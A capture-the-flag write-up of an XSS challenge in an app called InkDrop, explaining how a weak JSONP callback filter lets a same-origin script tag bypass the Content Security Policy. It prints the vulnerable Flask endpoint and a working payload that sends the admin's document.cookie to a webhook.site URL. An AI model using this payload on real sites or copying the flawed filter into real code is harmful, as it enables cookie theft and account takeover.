# InkDrop XSS Challenge - Writeup

## Starting Point

I found an XSS vulnerability in InkDrop and needed to steal the admin's flag cookie. The challenge was figuring out how to execute JavaScript in the admin's browser when they visit my malicious post.

## First Try: Static Image Tag

My first attempt was posting `<img src="https://webhook.site/uuid" />`. This actually worked! The image loaded and my webhook received the request. 

Why it worked? The browser automatically loads any `src` attribute on an image tag as a resource request, no JavaScript needed. This is a fundamental browser behavior.

The problem: I could only send static data. I couldn't access `document.cookie` because the `src` attribute is just a string, not executable code. A dead end for stealing the flag.

## Second Try: Inline Script Tag

Next I tried `<script>fetch('https://webhook.site/uuid/?'+document.cookie);</script>`. Nothing happened. The browser's Content Security Policy blocked it. Looking at post_view.html:

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; ...">
```

The `script-src 'self'` directive blocks inline `<script>` tags completely. Even though my script was injected via preview.js, the CSP still prevented execution. I needed a different vector.

## The JSONP Vulnerability

That's when I noticed the `/api/jsonp` endpoint in app.py:

```python
@app.route('/api/jsonp')
def api_jsonp():
    callback = request.args.get('callback', 'handleData')
    
    if '<' in callback or '>' in callback:
        callback = 'handleData'
    
    response = f"{callback}({json.dumps(user_data)})"
    return Response(response, mimetype='application/javascript')
```

This is the vulnerable part. The filter only blocks `<` and `>` characters. It doesn't block backticks, parentheses, slashes, or anything else I need to inject JavaScript template literals. The endpoint wraps my callback parameter in a function call and returns it as JavaScript.

The key insight: if I load this endpoint with a `<script src="">` tag (same origin, allowed by CSP), I can inject arbitrary code in the callback parameter. The server will return my code wrapped in the JSONP call, and the browser will execute it.

## The Winning Payload

I crafted: `<script src="/api/jsonp?callback=fetch`https://webhook.site/uuid/${document.cookie}`)//"></script>`

When this loads, the `/api/jsonp` endpoint receives my callback parameter and returns:

```javascript
fetch(`https://webhook.site/uuid/${document.cookie}`)//({"authenticated": true"username": "wherever","timestamp": 1708099200})
```
![craftedpayload](./.pic/crafted_test.png)

The browser interprets this as valid JavaScript: the fetch statement executes with the interpolated cookie, making a request to my webhook with the flag. The `//` comments out the JSON object that would otherwise cause a syntax error. Template literals with backticks aren't filtered, so they slip right through the weak JSONP validation.

## Why This Works

The vulnerability chain: CSP blocks inline scripts but allows same-origin script loading, the JSONP endpoint has insufficient callback validation, and template literals bypass the simple `<` and `>` filter. The combination creates a perfect exploit vector. The admin visits my post, the script tag loads from `/api/jsonp` with my malicious callback, JavaScript executes with admin privileges, and the flag gets exfiltrated to my webhook.

![craftedpayload](./.pic/flag_receiving.png)

Flag: `INTIGRITI{019c668f-bf9f-70e8-b793-80ee7f86e00b}`